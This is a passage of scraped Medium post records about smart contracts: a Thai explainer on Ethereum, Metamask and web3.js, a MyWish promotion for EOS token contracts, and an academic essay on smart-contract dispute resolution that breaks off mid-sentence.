\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Owner \u0e2b\u0e23\u0e37\u0e2d\u0e04\u0e19 Deploy \u0e40\u0e2a\u0e21\u0e2d \u0e42\u0e14\u0e22\u0e40\u0e21\u0e37\u0e48\u0e2d Deploy \u0e41\u0e25\u0e49\u0e27\u0e08\u0e30\u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e01\u0e47\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e01\u0e47\u0e1a\u0e40\u0e07\u0e34\u0e19\u0e44\u0e14\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e16\u0e49\u0e32\u0e1c\u0e39\u0e49 Deploy \u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e19\u0e33\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 Smart Contract \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e40\u0e02\u0e35\u0e22\u0e19\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e42\u0e2d\u0e19\u0e2d\u0e2d\u0e01\u0e44\u0e1b\u0e2b\u0e32\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22Smart Contract \u0e02\u0e2d\u0e07 CryptoKitties \u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e41\u0e25\u0e30\u0e21\u0e35\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e22\u0e39\u0e48 67.34 Ether \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e08\u0e49\u0e32\u0e02\u0e2d\u0e07 Smart Contract \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e16\u0e2d\u0e19\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e2d\u0e01\u0e44\u0e14\u0e49\u0e1c\u0e48\u0e32\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 withdrawBalanceUser \u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e01\u0e47\u0e43\u0e0a\u0e49\u0e2b\u0e25\u0e31\u0e01\u0e01\u0e32\u0e23\u0e40\u0e14\u0e35\u0e22\u0e27\u0e01\u0e31\u0e19\u0e01\u0e31\u0e1a Blockchain \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e04\u0e37\u0e2d \u0e44\u0e21\u0e48\u0e21\u0e35 Username, Password \u0e21\u0e35\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e41\u0e04\u0e48 Public Key \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e41\u0e17\u0e19\u0e02\u0e2d\u0e07 Username \u0e41\u0e25\u0e30 Private Key \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e41\u0e17\u0e19\u0e02\u0e2d\u0e07 Password \u0e41\u0e25\u0e30\u0e43\u0e0a\u0e49 Digital Signature \u0e2b\u0e23\u0e37\u0e2d\u0e25\u0e32\u0e22\u0e40\u0e0b\u0e47\u0e19\u0e14\u0e34\u0e08\u0e34\u0e15\u0e2d\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e48\u0e32\u0e07 \u0e46User \u0e17\u0e38\u0e01\u0e04\u0e19\u0e1a\u0e19 Ethereum \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e43\u0e14 \u0e46 \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e0b\u0e36\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e35\u0e48\u0e17\u0e33\u0e44\u0e14\u0e49\u0e01\u0e47\u0e15\u0e32\u0e21\u0e17\u0e35\u0e48 Smart Contract \u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15 \u0e44\u0e27\u0e49 \u0e42\u0e14\u0e22\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1a\u0e19 Web Browser \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e19\u0e31\u0e49\u0e19 User \u0e21\u0e31\u0e01\u0e08\u0e30\u0e43\u0e0a\u0e49 Metamask \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Chrome Extension \u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e01\u0e47\u0e1a Private Key \u0e41\u0e25\u0e30\u0e17\u0e33\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e47\u0e19\u0e25\u0e32\u0e22\u0e40\u0e0b\u0e47\u0e19\u0e14\u0e34\u0e08\u0e34\u0e15\u0e2d\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Smart Contract\u0e01\u0e32\u0e23\u0e17\u0e33 Website \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49 User \u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 Metamask \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07 Smart Contract \u0e1a\u0e19 Ethereum \u0e44\u0e14\u0e49\u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e43\u0e0a\u0e49 Javascript Library \u0e0a\u0e37\u0e48\u0e2d web3.js \u0e42\u0e14\u0e22\u0e2b\u0e32\u0e01 User \u0e17\u0e33\u0e01\u0e32\u0e23\u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07 Metamask \u0e44\u0e27\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e1a\u0e19\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e17\u0e38\u0e01\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e21\u0e48\u0e27\u0e48\u0e32\u0e08\u0e30\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a Ethereum \u0e2b\u0e23\u0e37\u0e2d\u0e44\u0e21\u0e48\u0e01\u0e47\u0e08\u0e30\u0e16\u0e39\u0e01 Inject \u0e15\u0e31\u0e27 web3.js \u0e44\u0e27\u0e49\u0e42\u0e14\u0e22 Metamask \u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e16\u0e49\u0e32\u0e04\u0e38\u0e13\u0e25\u0e07 Metamask \u0e44\u0e27\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e25\u0e2d\u0e07\u0e04\u0e25\u0e34\u0e01\u0e02\u0e27\u0e32 Inspect \u0e40\u0e27\u0e47\u0e1a\u0e2d\u0e30\u0e44\u0e23\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e25\u0e49\u0e27\u0e1e\u0e34\u0e21\u0e1e\u0e4c\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 web3 \u0e01\u0e47\u0e08\u0e30\u0e21\u0e35 return \u0e01\u0e25\u0e31\u0e1a\u0e21\u0e32\u0e40\u0e1e\u0e23\u0e32\u0e30 Metamask \u0e19\u0e31\u0e49\u0e19 Inject Web3 \u0e44\u0e27\u0e49\u0e43\u0e2b\u0e49\u0e17\u0e38\u0e01\u0e40\u0e27\u0e47\u0e1a\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e02\u0e49\u0e32\u0e01\u0e32\u0e23\u0e08\u0e30\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e43\u0e14 \u0e46 \u0e19\u0e31\u0e49\u0e19 User \u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e23\u0e32\u0e1a ABI \u0e2b\u0e23\u0e37\u0e2d Application Binary Interface \u0e02\u0e2d\u0e07 Smart Contract \u0e19\u0e31\u0e49\u0e19 \u0e46 \u0e42\u0e14\u0e22\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32 Smart Contract \u0e08\u0e30\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a ABI \u0e08\u0e32\u0e01\u0e01\u0e32\u0e23 Compile \u0e41\u0e25\u0e49\u0e27\u0e19\u0e33\u0e44\u0e1b\u0e41\u0e08\u0e01\u0e08\u0e48\u0e32\u0e22\u0e43\u0e2b\u0e49 User \u0e42\u0e14\u0e22 User \u0e08\u0e30\u0e40\u0e2d\u0e32 ABI \u0e44\u0e1b\u0e43\u0e0a\u0e49\u0e01\u0e31\u0e1a MyEtherWallet \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e39\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 ABI \u0e44\u0e14\u0e49\u0e43\u0e19\u0e42\u0e04\u0e49\u0e14\u0e14\u0e49\u0e32\u0e19\u0e25\u0e48\u0e32\u0e07[ {  \"constant\": true,  \"inputs\": [],  \"name\": \"sayHello\",  \"outputs\": [   {    \"name\": \"\",    \"type\": \"string\"   }  ],  \"payable\": false,  \"stateMutability\": \"pure\",  \"type\": \"function\" }]\u0e41\u0e15\u0e48\u0e43\u0e19\u0e17\u0e32\u0e07\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e08\u0e23\u0e34\u0e07 Website \u0e2b\u0e23\u0e37\u0e2d Client \u0e02\u0e2d\u0e07\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e08\u0e30\u0e40\u0e01\u0e47\u0e1a ABI \u0e44\u0e27\u0e49\u0e17\u0e35\u0e48 Website \u0e41\u0e25\u0e30\u0e1c\u0e39\u0e01 web3.js \u0e43\u0e2b\u0e49 User \u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e07\u0e48\u0e32\u0e22\u0e15\u0e48\u0e2d\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01 Metamask \u0e19\u0e31\u0e49\u0e19\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e40\u0e01\u0e47\u0e1a Private Key \u0e41\u0e17\u0e19 User \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e01\u0e34\u0e14 Use Case \u0e43\u0e2b\u0e21\u0e48 \u0e46 \u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e2a\u0e19\u0e43\u0e08\u0e02\u0e36\u0e49\u0e19 \u0e40\u0e0a\u0e48\u0e19 \u0e01\u0e32\u0e23 Login With Metamask \u0e42\u0e14\u0e22 User \u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e23\u0e2d\u0e01\u0e23\u0e2b\u0e31\u0e2a\u0e1c\u0e48\u0e32\u0e19\u0e41\u0e25\u0e30 Username \u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e43\u0e19 Website \u0e40\u0e25\u0e22\u0e41\u0e15\u0e48 User \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e23\u0e2d\u0e01 Password \u0e40\u0e1e\u0e37\u0e48\u0e2d Unlock Wallet \u0e01\u0e48\u0e2d\u0e19\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e17\u0e35\u0e48 Metamask \u0e2d\u0e22\u0e39\u0e48\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e04\u0e27\u0e32\u0e21\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22 \u0e41\u0e15\u0e48\u0e19\u0e31\u0e48\u0e19\u0e2b\u0e21\u0e32\u0e22\u0e04\u0e27\u0e32\u0e21\u0e27\u0e48\u0e32 Password \u0e19\u0e31\u0e49\u0e19\u0e16\u0e39\u0e01\u0e19\u0e33\u0e44\u0e1b\u0e16\u0e2d\u0e14\u0e23\u0e2b\u0e31\u0e2a\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19\u0e33 Private Key \u0e2d\u0e2d\u0e01\u0e21\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 \u0e15\u0e31\u0e27 Password \u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a Website \u0e41\u0e15\u0e48\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e43\u0e14", "responses": ""}, {"title": "MyWish Creates the First Smart Contracts Supported By EOS Blockchain.", "author_name": "Vladimir Tikhomirov", "link": "https://medium.com/@VladimirTikhomirov/mywish-creates-the-first-smart-contracts-supported-by-eos-blockchain-26b240e58b76?source=search_post", "post_date": "Aug 22, 2018", "readtime": "2 min read", "upvotes": "486", "content": "MyWish Creates the First Smart Contracts Supported By EOS Blockchain.What is the Token Smart Contract?Vladimir TikhomirovBlockedUnblockFollowFollowingAug 22, 2018The Token Smart Contract is supposed to be used for creating a personalized cryptocurrency. This, in turn, is used for running your own ICO or any other blockchain project. Personalized cryptocurrency could also be used for sale, distribution or crowdsale programs. The platform gives you a huge opportunity and all the rest is just a matter of your crypto potential. The ball is in your court.Real talk. Why should you choose to create Tokens on EOS over any other blockchain?Right after you create the Token Smart Contract on EOS Blockchain, you need to be prepared for the fastest possible speed of the transactions\u2019 execution. That has a potential to scale to millions of transactions per second. DPoS (Delegated Proof of Stake) modification is responsible for the instant transfer of your cryptocurrency.Whatever the reason for you creating your own Token Smart Contract hosted on EOS, you will definitely save money. EOS requests no gas for your transactions.You don\u2019t have to know any programming skills to write a complex code for your Smart Contract to automate and secure your activities on the EOS Blockchain. The MyWish Smart Contract Platform has your back!The price\u00a0tagThe price for a Token Smart Contract is 4800 WISH (0,99 ETH). This is the price for the most secure way of using your tokens: share them with your devoted community, distribute to small investors of your project or exchange for product creation or buying any service.How to create a Token Smart Contract specially designed for EOS blockchain?You can easily learn how to do that by creating a test version for the Token Smart Contract on EOS. We keep the test version available for anyone who needs it. People need to be more educated on the subject smart approaches to crypto projects. Crypto is no longer a digital dream, welcome to reality.STEP ONE: Follow the link https://contracts.mywish.io/create?blockchain=EOSSTEP TWO: Choose blockchain. It\u2019s time for the EOS.Token Smart Contract.STEP THREE:Enter the contract nameEnter the Token symbol which usually consists of 3\u20134 capital letters, but it\u2019s still up to you up to 7. Examples: Waves, BTC.EOS Account number (If you don\u2019t have one, it will take you 5 minutes to get it with the help of the MyWish EOS Account service)Keep in mind that there is a limit to the amount of tokens you can create.Happy Crypto End. Real Token Smart Contract will be deployed in 15 minutes.", "responses": ""}, {"title": "Smart Contract Dispute Resolution\u200a\u2014\u200aThe Need for an Open Source Blockchain Platform Ecosystem", "author_name": "Wulf Kaal", "link": "https://medium.com/semadaresearch/smart-contract-dispute-resolution-the-need-for-an-open-source-blockchain-platform-ecosystem-e6318610fdef?source=search_post", "post_date": "Jun 26, 2017", "readtime": "16 min read", "upvotes": "85", "content": "Smart Contract Dispute Resolution\u200a\u2014\u200aThe Need for an Open Source Blockchain Platform EcosystemWulf KaalBlockedUnblockFollowFollowingJun 26, 2017byWulf A. Kaal & Craig CalcaterraProf. Wulf A. Kaal,\u00a0Ph.D.Prof. Craig Calcaterra, Ph.D.AbstractAn open source platform ecosystem for dispute resolution of crypto transactions allows users to opt into a conflict resolution mechanism that enables more nuanced crypto solutions and produces greater certainty for legacy businesses than existing solutions such as the Aragon network or OpenBazaar. The ecosystem provides anonymized arbiter expertise via rankings in combination with a representation option for crypto disputes. It provides an effective resolution mechanism for legacy businesses that desire to participate in the growth of crypto business opportunities, hope to avoid legacy system intermediation and the associated transaction costs, but require legal legacy system assurances and crypto dispute resolution equivalence.IntroductionAny existing business logic can be coded into a blockchain. Blockchain technology is a computer architecture for an open and secure distributed database. A blockchain, in essence, is an autonomous dynamically growing chain of blocks of encrypted data generated by a decentralized group of users. Most blockchains, such as Ethereum (but not Bitcoin) are Turing complete, or computationally universal, meaning any calculation possible can be simulated within a blockchain design. In other words, blockchain can do what any other computer program can do\u200a\u2014\u200afrom controlling a Mars lander to moderating online competitive video games between Europe and China. Accordingly, any existing business logic can be coded into the blockchain, giving it extremely wide applicability in almost all industries and subject areas.Because of its very expansive and near universal applicability, it is crucial for the broadening evolution of blockchain technology to find jurisdictional means for the governance of the crypto economy that is facilitated and sustained by blockchain technology. A lack of governance and conflict resolution mechanisms would undermine the democratized trust created by blockchain technology and hinder its broadening evolution and applicability. Jurisdictional means are the basis for effective conflict resolution mechanisms applicable to crypto transactions in the blockchain. Not having the required jurisdictional means necessary for conflict resolution mechanisms for Ethereum blockchain-based smart contracting, may invoke consumer mistrust in the new technology. This can then undermine the evolution of the blockchain-based crypto economy.Regulatory alternatives for blockchain-based conflict resolution are necessitated by the impossibility of consistently identifying the parties in any dispute in the context of crypto transactions on the blockchain and the associated problems of applying the existing legal infrastructure. We cannot conceptualize opportunities in the crypto transactional universe that could possibly enable and allow a court in the existing legal infrastructure to decide and enforce any disputes between crypto transactional parties. Because of the severity of these challenges for the existing legal and jurisdictional infrastructure, we conclude that the sensible approach for including good governance in crypto transactions necessitates instituting governance solutions inherent in the blockchain technology itself. Accordingly, we introduce the concept of a distributed jurisdiction, which we hereinafter evaluate.Limited Regulatory OversightThe regulatory oversight over blockchain-based transactions is severely limited. Courts arguably cannot have jurisdiction over blockchain-based smart contracts because it is unlikely a court could find out who transacted via the anonymized blockchain. Furthermore, the court could not change or otherwise affect the transaction as it was coded because once the coded parameters were fulfilled the transaction auto-executed on the blockchain. Because of automated execution, contractual breach and damages are less likely to occur in smart contracts, especially as compared to traditional contracts. If a given smart contract transaction disadvantages one of the contracting parties, courts would have to change the blockchain in order to institute remedies in the traditional sense that could pertain to the smart contract in question. However, that scenario is computationally and practically impossible.Assuming the parties to a given smart contract were known, courts could require the parties to create a new transaction to reverse undesirable outcomes of the coded and executed transaction that was disputed. This is a possible solution because courts are unable to affect the initial outcome of a disputed smart contract transaction. Courts cannot require a retroactive change in the blockchain because that is computationally near impossible. Given that the requirements for a court to exercise jurisdiction over a disputed smart contract are fundamentally different from courts\u2019 jurisdiction over contracts in the existing legal infrastructure, contracting parties would likely second-guess courts\u2019 decisions pertaining to smart contract disputes. In other words, real world court decisions even if attainable may not have the same legitimacy and authority as other intra-blockchain dispute resolution mechanism may have. In summary, courts would only be able to force the parties to execute a secondary transaction or otherwise pay remedies for a smart contract that created damages for one of the parties. Courts would not be able to actually change or interpret the terms of the given smart contract that was executed according to its parameters and added to the blockchain where it is immutable.Because of these inherent limitations, courts will generally not be able to effectuate resolutions to disputes arising from blockchain-based smart contracts. Courts do not have the power over the coder and the code that was used by the parties that may have been injured. Courts do not have the authority to dictate to a programmer how, when, and where to change the existing code used by consumers. Even if courts were given such authority, no programmer so coerced by the court would be able to override the will of the majority of anonymous international blockchain users to make an effective change. Therefore, blockchain-based resolution mechanisms are the only possible recourse for smart contract disputes.Our proposal for courts to leave dispute resolution to blockchain-based mechanisms is not a mere theoretical postulate. Rather, this need was already introduced in the second and third prongs in Aragon\u2019s whitepaper about blockchain-based solutions for consumers facing code execution problems in smart contracts.Anonymity of Blockchain TransactionsThe lack of identifiable parties in crypto transactions creates a distinct separation between real world and crypto transactions that has lasting implications for the application of existing jurisdictional principles. The aforementioned anonymity gained by the use of public-key encrypted identities and VPNs prevents the identification of the parties to a smart contract. Without identifiable parties, jurisdictional principles such as subject matter jurisdiction, personal jurisdiction, diversity jurisdiction, and federal question jurisdiction become irrelevant. To illustrate this point, proving personal jurisdiction by means of 1. Physical Presence, 2. Domicile/Place of Business, 3. Consent, and 4. Minimum Contacts becomes impossible as none of these elements are known of the parties in a smart contract. Physical presence is anonymous, as is domicile, consent, and minimum contacts. Subject-matter jurisdiction, e.g. a given court can exercise power over a claim that the laws of the jurisdiction authorize such court to hear, is inapplicable because no given law would be able to authorize such power. But even if a given State or even the Federal Government were to pass a law that would grant such authority to a court, it is hard to see how the court would in fact exercise such authority, short of limiting access to the internet itself.Not all smart contracts are fully anonymous and untouchable by traditional jurisdictional means. Some smart contracts will not automatically anonymize the parties because there is a physical element to such a consumer contract. For example, a powerful traditional corporation may wish to execute a complicated, non-hostile takeover of another company, using their reputation as leverage. The transparent, public, and perfectly logical structure of a smart contract could theoretically improve communication in such a negotiation. However, many other smart service contracts can be completely anonymous. For instance, a service contract involving services pertaining to cyberspace, such as programming services to create a given webpage, will be completely anonymous. It is important to note that as the technology becomes more widely accepted, such service contracts are going to become a highly important part of any given economy.Even outside of cyberspace services, it is clearly possible that bounties for anonymous work executed via smart contracts will make traditional service contracts that require personal knowledge and physical appearance redundant. A bounty contract for anonymous work allows an anonymous employer to put a bounty on a given job and offer such a job on an anonymous smart contracting network to an anonymous counterparty. The contract acceptance and performance is dictated to some extent by reputational factors that link the counterparty and the performance under the contract. Part of the value of anonymity in such instances is the clear efficiency advantage. The bureaucracy that attends traditional employment is in this case greatly reduced, if not eliminated.Enforcement of Smart ContractsThe enforcement of smart contracts with traditional legal means is limited. First, disputing a smart contract with traditional means (in court, arbitration, mediation, etc.) is only marginally possible because of the aforementioned anonymity in blockchain transactions. Moreover, while smart contracts are coded as self-executing contracts, they do not necessarily provide effective mechanisms for enforcement if one party breaches his or her obligations in the smart contract. Semantically, it may be argued that breach of a smart contract is not even possible: the contract simply will not execute if a parameter is not fulfilled.The literature is split on remedies for breaches of smart contracts. Some argue that because the smart contract replaces the existing legal contract in some circumstances, the smart contract will be governed by the same legal principles as the existing legal contract. Others argue that the breaching party may not live in an area where the courts have jurisdiction, thus the breaching party cannot be liable. In that case, assuming the operator knows the identities of the contracting parties, the operator of the blockchain platform should have a legal obligation to identify who the breaching party was and serve as the counterparty in a dispute scenario. These experts argue the operator of the blockchain should establish governing rules of the blockchain and specifications for dispute resolution. However, these specifications would have to be disclosed upfront and agreed upon by the parties to the smart contract in order to be enforceable.Courts may be substantially challenged in interpreting smart contracts. Unlike the interpretation of a contractual dispute in the existing legal infrastructure where courts will assess what the contentious language in a given contract may mean to a reasonable human observer, smart contracts are not coded for a human observer. Rather they are intended for computer programming in a network of nodes (and in the future for artificial intelligence). To the extent that consumers are using smart contracts, the human element may be increased via the coding of graphical user interfaces. The basic premise of smart contracting remains emphasized on computer programming (and in the future artificial intelligence) not human interaction. Because of the emphasis on code for computer programming (and artificial intelligence), courts may not be able to hypothesize a reasonable human\u2019s interpretation of a given smart contract. Courts may also be limited in their ability to consult programmers to interpret the coded language at issue in a given case because the meaning and logical reasoning of coded language is substantially different from human language.From an evidentiary perspective, it is unclear who would own smart contracting blockchain contributions and whether there would be any applicable protections, such as work product or confidentiality. Without ownership rights for a blockchain transaction, it is also unclear who would be able to claim privileged information or how discovery would operate via existing laws. However, when the parties to a smart contract choose to reveal their identities, arguably privileged information or discovery laws should apply as if it was a written contract despite the fact that the contract was written in code.Contract law remedies may not apply to smart contracts which raises possible enforceability issues. If a transaction in a smart contract fails to be completed or is partially completed but not added to the blockchain, it is unclear how liability will be allocated if those eventualities have not been accounted for in applicable code. Because of the blockchain\u2019s decentralized nature, it is unclear who or what is accountable and could require regulation. Without solutions for those issues, liability for failed transactions or conflicts between parties have little guidance as to being resolved.Distributed JurisdictionThe nature of smart contracting necessitates crypto dispute resolution mechanisms. Problems with smart contracts tend to be two-fold. First, while smart contracts can be coded for and encapsulate a substantial portion of possible breaches of contract, subjectivity in human relationship, bounded rationality of coders and contracting parties, incomplete foresight, incomplete information, and opportunistic behavior will make breaches or other problems in smart contracts inevitable. Second, the first DAO has demonstrated that software and coding bugs will be inevitable in the evolution of the crypto economy. As the existing jurisdictional infrastructure is bound to produce suboptimal results for such crypto disputes, intra-blockchain distributed jurisdictional means are needed.Our proposal in this paper for a distributed jurisdiction over blockchains has to fulfill two core requirements: 1. The anonymity of blockchain-based smart contracting has to be maintained as the technology evolves. Without anonymity of blockchain-based smart contracting the existing jurisdictional means (in personam jurisdiction) can apply to smart contracting which would undermine the evolution of the crypto economy and make distributed jurisdictional means unnecessary. 2. Distributed jurisdictional means necessitate governance from within the blockchain technology itself to effectively address the problems inherent in blockchain-based smart contracts. Without internal blockchain-based governance, a fully self-sufficient crypto economy may not be possible as legacy systems and governance intermediaries in the existing legal infrastructure will attempt to interfere with crypto transactions, resulting in suboptimal outcomes that cannot be fully resolved in the existing legal infrastructure.Both requirements for the development of distributed jurisdictional means, full anonymity and intra-blockchain jurisdictional means, can already be accomplished. First, the Ties Network project demonstrates that anonymity can be perpetuated in blockchain technology, despite blockchains\u2019 eternal storage of information and its growing size working against anonymity. Second, the Aragon Network demonstrates that the technology itself offers means of internal controls that help ensure effective governance in the continuing evolution of the technology.The Need for an Open Source Blockchain Platform Ecosystem for Smart Contract Dispute ResolutionBased on the concept of a distributed jurisdiction, we suggest an open source platform ecosystem of smart contracting dispute resolution that allows users to opt into the conflict resolution mechanisms that enable more nuanced crypto solutions and produce greater (legal) certainty in the process. First, an open source platform based ecosystem for dispute resolution of crypto transactions could help ensure anonymity in blockchain transactions by facilitating anonymity for transaction parties to opt into the platform. Second, the platform would allow users to identify the highest possible expertise of their judges and arbitrators by way of reviewing the record of decisions of their judges across different fora and different types of conflicts. The proposed platform ecosystem would significantly boost consumer confidence in the non-arbitrary and fair resolution of their disputes. Our proposal constitutes an open source ecosystem hybrid that provides effective solutions for the shortcomings in the Aragon and OpenBazaar models.In contrast with the OpenBazaar solutions, our proposed open source ecosystem allows dispute resolution only if and when a smart contract has resulted in a dispute. This solution ensures that smart contracting transaction costs remain near zero and the cost of paying an arbiter/notary/judge only occurs in cases of smart contract dispute resolution issues which will be a fraction of the overall quantity of smart contracts executed in the evolving crypto economy. As such, our proposal helps stimulate the evolution of the crypto economy. We envision a further improvement in comparison with OpenBazaar\u2019s approach which includes an open review system for evaluating the reputations of arbiters. Arbiters would submit their judgements to the community for review, removing all personal information to ensure anonymity. The community could upvote or downvote such judgments. Arbiters could improve their reputations by submitting comments and counter-judgements for upvotes in an open forum.This proposal has several benefits that can be distinguished from the Aragon network in several important ways. It involves the same necessarily democratic solution as in the Aragon system, except for several core differences: 1. The cases are not bound to binary decisions (it\u2019s unclear how 5 anonymous judges would collaborate to give a nuanced answer in Aragon). 2. Crowdsourcing the judgments leads to more efficient appeals. 3. Decisions would be open to re-evaluation for all eternity, so the judges\u2019 reputations are subject to a greater ideal than mere contemporary popularity. Further, this approach still promotes the eternal anonymity of parties and arbiters, as judges who revealed private information would be severely downvoted. Thus, our proposal provides more nuanced and better outcomes with better representation for parties in smart contract dispute resolution.By way of analogy, just as federal courts in the existing legal infrastructure often provide better outcomes for litigants than state courts, because of the better qualifications of judges and the higher stakes involved, among other factors, our open source ecosystem would allow litigants more choice among dispute resolution mechanisms, enable better representation, and facilitate increased quality of arbiters. For claimants who have an interest in the best possible outcomes and are willing to wait analog times (\u22481 month) the platform provides ideal fora to settle disputes.Legal EquivalenceStakeholders in legacy systems will likely hesitate transferring their legacy infrastructure businesses, and revenue streams derived therefrom, to an uncertain blockchain infrastructure and crypto systems without significant and sufficiently incentivizing assurances that they are not sacrificing any attained existing legal rights in exchange for smart contract efficiency in a blockchain system. Accordingly, the adjudication, dispute resolution, and enforcement of smart contracting disputes in the evolving crypto economy have to provide equivalent measures that assure legacy businesses that they can operate in crypto systems without a surrender of existing rights.Legal equivalence can be assured in the implementation and transition phase of the crypto economy via dual integration. Dual integration refers to the use of legacy legal infrastructure in smart contracting dispute resolution, such as via the Ricardian contracts, among other measures, in combination with intra-blockchain systems for the resolution of smart contract disputes.For participants in the crypto economy who wish to minimize the transaction costs of dual integration and retain anonymity our proposed open platform ecosystem is more likely than all other solutions to provide legal equivalence of dispute resolution mechanisms. Our proposed system would maintain the importance of good education and reputation on the principles of law. Yet, it would still eradicate much of the corrupting collection of power that specialized knowledge and relationships give to analog lawyers.Anonymous Arbiter ExpertiseThe platform ecosystem would allow users to identify the highest possible expertise of their anonymous judges and arbitrators by way of reviewing the record of decisions of their judges across different fora and different types of conflicts. We propose using the open and eternal ledger for purposes of listing the following information pertaining to a given decision maker in smart contracting disputes: 1. Contractual Subject Matter, 2. Cases, 3. Decisions, 4. Justifications for Decision, 5. Dicta. Based on such disclosures, we propose an open system that allows comments which could be up-voted or down-voted.The system allows for the expertise of judges to be determined by anonymous rating systems or 